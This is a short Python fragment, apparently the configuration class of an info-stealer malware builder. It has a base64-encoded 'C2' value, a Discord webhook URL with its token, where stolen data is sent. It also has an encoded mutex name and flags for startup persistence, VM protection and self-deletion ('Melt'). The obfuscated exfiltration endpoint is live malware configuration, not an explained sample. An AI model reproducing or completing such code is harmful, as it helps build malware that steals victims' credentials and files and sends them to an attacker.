...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMDQ3MDUzMTQxNjc4OTA2My9hdm9vRERjQVI5LVVqUXFRWHQ0T0diNk1VbVY1VXNkUHdBRnF2dFNISjlFMlFnaFBFUUN4WVJCcGJyME15bjl6ZS1GOA==').decode())
    Mutex = base64.b64decode('TWtiQzBKN0RTRWNrdnFKVg==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
